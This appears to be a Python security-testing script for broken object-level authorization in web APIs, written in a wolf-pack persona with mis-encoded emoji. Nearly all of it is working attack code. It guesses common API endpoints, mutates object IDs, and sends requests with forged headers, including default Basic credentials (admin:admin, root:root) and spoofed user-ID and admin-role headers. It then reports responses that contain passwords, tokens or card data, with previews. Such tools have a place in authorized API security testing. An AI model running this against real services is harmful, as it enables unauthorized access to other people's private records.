#!/usr/bin/env python3
"""
üê∫ BOLA (Broken Object Level Authorization) Attacks

*snarls with predatory cunning* These exploits test for Broken Object Level
Authorization vulnerabilities - the #1 API security risk according to OWASP.
We hunt for unauthorized access to objects by manipulating IDs and parameters.

The pack coordinates systematic enumeration of object IDs, privilege escalation
attempts, and cross-tenant data access to expose weak authorization controls!
"""

import asyncio
import base64
import hashlib
import logging
import uuid
from typing import Any
from urllib.parse import urljoin

import aiohttp

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


class BOLAAttacker:
    """
    üê∫ *alpha predator stance* BOLA exploitation class that systematically
    hunts for broken object-level authorization across API endpoints.
    """

    def __init__(self, target_url: str = "http://localhost:8000"):
        self.target_url = target_url.rstrip("/")
        self.session: aiohttp.ClientSession | None = None
        self.discovered_endpoints: set[str] = set()
        self.valid_objects: dict[str, Any] = {}
        self.authorization_headers: list[dict[str, str]] = []

    async def __aenter__(self):
        self.session = aiohttp.ClientSession()
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.session:
            await self.session.close()

    def generate_id_variations(self, base_id: str) -> list[str]:
        """
        üê∫ *sniffs for weakness* Generate variations of object IDs to test
        for predictable patterns and weak ID generation.
        """
        variations = [base_id]

        # Numeric ID variations
        if base_id.isdigit():
            base_num = int(base_id)
            variations.extend(
                [
                    str(base_num - 1),
                    str(base_num + 1),
                    str(base_num - 10),
                    str(base_num + 10),
                    str(base_num * 2),
                    str(base_num // 2) if base_num > 1 else "0",
                    "1",  # First object
                    "0",  # Potential admin object
                    "999999",  # High number
                    "-1",  # Negative number
                    str(base_num)[::-1],  # Reversed
                ]
            )

        # UUID variations
        if len(base_id) == 36 and base_id.count("-") == 4:
            # Generate similar UUIDs
            for i in range(5):
                new_uuid = str(uuid.uuid4())
                variations.append(new_uuid)

            # Manipulate existing UUID
            uuid_parts = base_id.split("-")
            if len(uuid_parts) == 5:
                # Change last character
                modified = uuid_parts[4][:-1] + (
                    "0" if uuid_parts[4][-1] != "0" else "1"
                )
                variations.append("-".join(uuid_parts[:-1] + [modified]))

        # Hash-based ID variations
        if len(base_id) in [32, 40, 64]:  # MD5, SHA1, SHA256 lengths
            # Generate similar looking hashes
            for i in range(3):
                hash_input = f"{base_id}_{i}"
                if len(base_id) == 32:
                    new_hash = hashlib.md5(hash_input.encode()).hexdigest()
                elif len(base_id) == 40:
                    new_hash = hashlib.sha1(hash_input.encode()).hexdigest()
                else:
                    new_hash = hashlib.sha256(hash_input.encode()).hexdigest()
                variations.append(new_hash)

        # Base64 encoded variations
        try:
            decoded = base64.b64decode(base_id + "==").decode("utf-8", errors="ignore")
            if decoded:
                # Modify decoded content
                modified_decoded = (
                    decoded[:-1] + "1" if decoded[-1] != "1" else decoded[:-1] + "0"
                )
                modified_encoded = (
                    base64.b64encode(modified_decoded.encode()).decode().rstrip("=")
                )
                variations.append(modified_encoded)
        except Exception:
            pass

        # String-based ID variations
        if not base_id.isdigit() and len(base_id) < 20:
            variations.extend(
                [
                    base_id.upper(),
                    base_id.lower(),
                    base_id + "1",
                    base_id + "admin",
                    "admin" + base_id,
                    base_id.replace(base_id[-1], "1") if base_id else "1",
                    base_id.replace(base_id[0], "a") if base_id else "a",
                ]
            )

        return list(set(variations))  # Remove duplicates

    def generate_auth_bypass_headers(self) -> list[dict[str, str]]:
        """
        üê∫ *pack hunting formation* Generate authorization bypass headers
        to test for authentication and authorization weaknesses.
        """
        bypass_headers = [
            {},  # No auth
            {"Authorization": ""},  # Empty auth
            {"Authorization": "Bearer "},  # Empty Bearer
            {"Authorization": "Bearer invalid"},  # Invalid token
            {"Authorization": "Bearer null"},  # Null token
            {"Authorization": "Bearer admin"},  # Simple admin token
            {"Authorization": "Bearer test"},  # Test token
            {"Authorization": "Basic YWRtaW46YWRtaW4="},  # admin:admin
            {"Authorization": "Basic dGVzdDp0ZXN0"},  # test:test
            {"Authorization": "Basic cm9vdDpyb290"},  # root:root
            {"X-User-ID": "1"},  # Direct user ID header
            {"X-User-ID": "0"},  # Admin user ID
            {"X-User-ID": "admin"},  # Admin string
            {"X-Admin": "true"},  # Admin flag
            {"X-Role": "admin"},  # Admin role
            {"X-Auth-User": "admin"},  # Auth user
            {"X-Original-User": "admin"},  # Original user
            {"X-Forwarded-User": "admin"},  # Forwarded user
            {"User": "admin"},  # Simple user header
            {"Role": "admin"},  # Role header
            {"X-API-Key": "admin"},  # Admin API key
            {"X-API-Key": "test"},  # Test API key
            {"X-Token": "admin"},  # Admin token
        ]

        return bypass_headers

    async def discover_api_endpoints(self) -> list[str]:
        """
        üê∫ *scouts territory* Discover API endpoints through common patterns
        and endpoint enumeration.
        """
        common_endpoints = [
            "/api/users",
            "/api/user",
            "/api/users/{id}",
            "/api/user/{id}",
            "/api/accounts/{id}",
            "/api/account/{id}",
            "/api/profiles/{id}",
            "/api/profile/{id}",
            "/api/posts/{id}",
            "/api/post/{id}",
            "/api/documents/{id}",
            "/api/document/{id}",
            "/api/files/{id}",
            "/api/file/{id}",
            "/api/orders/{id}",
            "/api/order/{id}",
            "/api/transactions/{id}",
            "/api/transaction/{id}",
            "/api/comments/{id}",
            "/api/comment/{id}",
            "/api/messages/{id}",
            "/api/message/{id}",
            "/api/invoices/{id}",
            "/api/invoice/{id}",
            "/api/reports/{id}",
            "/api/report/{id}",
            "/api/admin/users/{id}",
            "/api/admin/accounts/{id}",
            "/api/v1/users/{id}",
            "/api/v2/users/{id}",
            "/users/{id}",
            "/user/{id}",
            "/accounts/{id}",
            "/posts/{id}",
            "/documents/{id}",
            "/files/{id}",
        ]

        discovered = []

        if not self.session:
            return discovered

        for endpoint in common_endpoints:
            try:
                # Test with a sample ID
                test_endpoint = endpoint.replace("{id}", "1")
                async with self.session.get(
                    urljoin(self.target_url, test_endpoint), timeout=5
                ) as response:
                    # Consider endpoint valid if it doesn't return 404
                    if response.status != 404:
                        discovered.append(endpoint)
                        self.discovered_endpoints.add(endpoint)
                        logger.info(
                            f"üê∫ Discovered endpoint: {test_endpoint} (Status: {response.status})"
                        )

            except Exception as e:
                logger.debug(f"Error testing endpoint {endpoint}: {e!s}")

        return discovered

    async def extract_object_ids(self, endpoint: str) -> list[str]:
        """
        üê∫ *sniffs for prey* Extract valid object IDs from API responses
        to use as baseline for BOLA testing.
        """
        object_ids = []

        if not self.session:
            return object_ids

        # Try to get list of objects
        list_endpoint = endpoint.replace("/{id}", "")

        try:
            async with self.session.get(
                urljoin(self.target_url, list_endpoint), timeout=10
            ) as response:
                if response.status == 200:
                    data = await response.json()

                    # Extract IDs from common response structures
                    if isinstance(data, list):
                        for item in data[:10]:  # Limit to first 10
                            if isinstance(item, dict):
                                # Common ID field names
                                id_fields = [
                                    "id",
                                    "user_id",
                                    "account_id",
                                    "post_id",
                                    "document_id",
                                    "file_id",
                                    "_id",
                                    "uuid",
                                    "guid",
                                ]
                                for field in id_fields:
                                    if item.get(field):
                                        object_ids.append(str(item[field]))

                    elif isinstance(data, dict):
                        # Handle paginated responses
                        for key in ["data", "items", "results", "records"]:
                            if key in data and isinstance(data[key], list):
                                for item in data[key][:10]:
                                    if isinstance(item, dict):
                                        id_fields = [
                                            "id",
                                            "user_id",
                                            "account_id",
                                            "post_id",
                                            "document_id",
                                            "file_id",
                                            "_id",
                                            "uuid",
                                            "guid",
                                        ]
                                        for field in id_fields:
                                            if item.get(field):
                                                object_ids.append(str(item[field]))

        except Exception as e:
            logger.debug(f"Error extracting IDs from {list_endpoint}: {e!s}")

        # If no IDs found, try some common test IDs
        if not object_ids:
            object_ids = ["1", "2", "3", "test", "admin", str(uuid.uuid4())]

        return list(set(object_ids))  # Remove duplicates

    async def test_bola_vulnerability(
        self, endpoint: str, object_id: str, auth_headers: dict[str, str]
    ) -> dict[str, Any]:
        """
        üê∫ *silent attack* Test for BOLA vulnerability on a specific object
        with given authentication headers.
        """
        test_endpoint = endpoint.replace("{id}", object_id)

        try:
            # Test GET request
            async with self.session.get(
                urljoin(self.target_url, test_endpoint),
                headers=auth_headers,
                timeout=10,
            ) as response:

                response_text = await response.text()

                # Analyze response for BOLA indicators
                bola_indicators = {
                    "accessible": response.status == 200,
                    "contains_sensitive_data": False,
                    "contains_user_data": False,
                    "contains_admin_data": False,
                    "response_size": len(response_text),
                    "status_code": response.status,
                }

                if response.status == 200:
                    response_lower = response_text.lower()

                    # Check for sensitive data patterns
                    sensitive_patterns = [
                        "password",
                        "secret",
                        "token",
                        "key",
                        "private",
                        "ssn",
                        "social",
                        "credit",
                        "card",
                        "bank",
                        "account",
                        "email",
                        "phone",
                        "address",
                        "personal",
                    ]
                    bola_indicators["contains_sensitive_data"] = any(
                        pattern in response_lower for pattern in sensitive_patterns
                    )

                    # Check for user data patterns
                    user_patterns = [
                        "username",
                        "user_id",
                        "profile",
                        "name",
                        "email",
                        "firstname",
                        "lastname",
                        "fullname",
                    ]
                    bola_indicators["contains_user_data"] = any(
                        pattern in response_lower for pattern in user_patterns
                    )

                    # Check for admin data patterns
                    admin_patterns = [
                        "admin",
                        "administrator",
                        "root",
                        "superuser",
                        "privilege",
                        "role",
                        "permission",
                    ]
                    bola_indicators["contains_admin_data"] = any(
                        pattern in response_lower for pattern in admin_patterns
                    )

                return {
                    "endpoint": test_endpoint,
                    "object_id": object_id,
                    "auth_headers": auth_headers,
                    "indicators": bola_indicators,
                    "vulnerable": (
                        bola_indicators["accessible"]
                        and (
                            bola_indicators["contains_sensitive_data"]
                            or bola_indicators["contains_user_data"]
                        )
                    ),
                    "response_preview": response_text[:200] if response_text else "",
                }

        except Exception as e:
            logger.debug(f"Error testing BOLA on {test_endpoint}: {e!s}")
            return {
                "endpoint": test_endpoint,
                "object_id": object_id,
                "auth_headers": auth_headers,
                "error": str(e),
                "vulnerable": False,
            }

    async def comprehensive_bola_test(self, endpoint: str) -> dict[str, Any]:
        """
        üê∫ *coordinated pack hunt* Run comprehensive BOLA testing on an endpoint
        with multiple object IDs and authorization bypass attempts.
        """
        logger.info(f"üê∫ Starting BOLA testing on {endpoint}")

        # Extract valid object IDs
        object_ids = await self.extract_object_ids(endpoint)
        logger.info(f"üê∫ Found {len(object_ids)} object IDs to test")

        # Generate authorization bypass headers
        auth_variations = self.generate_auth_bypass_headers()

        results = {
            "endpoint": endpoint,
            "total_tests": 0,
            "vulnerable_objects": [],
            "suspicious_responses": [],
            "access_patterns": {},
            "summary": {
                "total_accessible": 0,
                "with_sensitive_data": 0,
                "with_user_data": 0,
                "with_admin_data": 0,
                "potentially_vulnerable": 0,
            },
        }

        # Test each object ID with each auth variation
        for object_id in object_ids:
            # Generate ID variations for this object
            id_variations = self.generate_id_variations(object_id)

            for test_id in id_variations[
                :5
            ]:  # Limit variations to avoid too many requests
                for auth_headers in auth_variations[:10]:  # Limit auth variations

                    test_result = await self.test_bola_vulnerability(
                        endpoint, test_id, auth_headers
                    )

                    results["total_tests"] += 1

                    if test_result.get("vulnerable", False):
                        results["vulnerable_objects"].append(test_result)
                        results["summary"]["potentially_vulnerable"] += 1
                        logger.warning(
                            f"üê∫ BOLA VULNERABILITY: {test_result['endpoint']}"
                        )

                    # Update summary statistics
                    indicators = test_result.get("indicators", {})
                    if indicators.get("accessible", False):
                        results["summary"]["total_accessible"] += 1
                    if indicators.get("contains_sensitive_data", False):
                        results["summary"]["with_sensitive_data"] += 1
                    if indicators.get("contains_user_data", False):
                        results["summary"]["with_user_data"] += 1
                    if indicators.get("contains_admin_data", False):
                        results["summary"]["with_admin_data"] += 1

                    # Track access patterns
                    auth_key = str(auth_headers)
                    if auth_key not in results["access_patterns"]:
                        results["access_patterns"][auth_key] = 0
                    if indicators.get("accessible", False):
                        results["access_patterns"][auth_key] += 1

                    # Small delay to avoid overwhelming the server
                    await asyncio.sleep(0.05)

        logger.info(
            f"üê∫ BOLA test complete for {endpoint}: "
            f"{results['summary']['potentially_vulnerable']} vulnerabilities found"
        )

        return results

    async def run_full_bola_assessment(self) -> dict[str, Any]:
        """
        üê∫ *territory-wide hunt* Run full BOLA assessment across all discovered
        API endpoints.
        """
        logger.info("üê∫ Starting comprehensive BOLA assessment...")

        # Discover API endpoints
        endpoints = await self.discover_api_endpoints()
        logger.info(f"üê∫ Testing {len(endpoints)} endpoints for BOLA vulnerabilities")

        assessment_results = {
            "target_url": self.target_url,
            "endpoints_tested": len(endpoints),
            "endpoint_results": [],
            "overall_summary": {
                "total_vulnerabilities": 0,
                "vulnerable_endpoints": 0,
                "total_tests": 0,
                "high_risk_findings": 0,
            },
        }

        # Test each endpoint
        for endpoint in endpoints:
            endpoint_result = await self.comprehensive_bola_test(endpoint)
            assessment_results["endpoint_results"].append(endpoint_result)

            # Update overall summary
            assessment_results["overall_summary"]["total_tests"] += endpoint_result[
                "total_tests"
            ]
            assessment_results["overall_summary"][
                "total_vulnerabilities"
            ] += endpoint_result["summary"]["potentially_vulnerable"]

            if endpoint_result["summary"]["potentially_vulnerable"] > 0:
                assessment_results["overall_summary"]["vulnerable_endpoints"] += 1

            if (
                endpoint_result["summary"]["with_sensitive_data"] > 0
                or endpoint_result["summary"]["with_admin_data"] > 0
            ):
                assessment_results["overall_summary"]["high_risk_findings"] += 1

        logger.info(
            f"üê∫ BOLA assessment complete: "
            f"{assessment_results['overall_summary']['total_vulnerabilities']} vulnerabilities found "
            f"across {assessment_results['overall_summary']['vulnerable_endpoints']} endpoints"
        )

        return assessment_results


async def main():
    """
    üê∫ *howls with pack coordination* Main hunting function for BOLA exploitation.
    """
    target_url = "http://localhost:8000"

    async with BOLAAttacker(target_url) as attacker:
        print("üê∫ Starting BOLA (Broken Object Level Authorization) Assessment...")

        # Run full BOLA assessment
        results = await attacker.run_full_bola_assessment()

        print("\nüê∫ BOLA ASSESSMENT RESULTS:")
        print(f"Endpoints tested: {results['endpoints_tested']}")
        print(f"Total tests performed: {results['overall_summary']['total_tests']}")
        print(
            f"Vulnerabilities found: {results['overall_summary']['total_vulnerabilities']}"
        )
        print(
            f"Vulnerable endpoints: {results['overall_summary']['vulnerable_endpoints']}"
        )
        print(f"High-risk findings: {results['overall_summary']['high_risk_findings']}")

        # Show detailed results for vulnerable endpoints
        print("\nüê∫ VULNERABLE ENDPOINT DETAILS:")
        for endpoint_result in results["endpoint_results"]:
            if endpoint_result["summary"]["potentially_vulnerable"] > 0:
                print(f"\nEndpoint: {endpoint_result['endpoint']}")
                print(
                    f"  Vulnerabilities: {endpoint_result['summary']['potentially_vulnerable']}"
                )
                print(
                    f"  Accessible objects: {endpoint_result['summary']['total_accessible']}"
                )
                print(
                    f"  With sensitive data: {endpoint_result['summary']['with_sensitive_data']}"
                )
                print(
                    f"  With admin data: {endpoint_result['summary']['with_admin_data']}"
                )

                # Show some vulnerable objects
                for vuln in endpoint_result["vulnerable_objects"][:3]:
                    print(f"    ‚úì Vulnerable object: {vuln['object_id']}")
                    print(f"      Auth: {vuln['auth_headers']}")
                    if vuln.get("response_preview"):
                        print(f"      Preview: {vuln['response_preview'][:100]}...")


if __name__ == "__main__":
    asyncio.run(main())
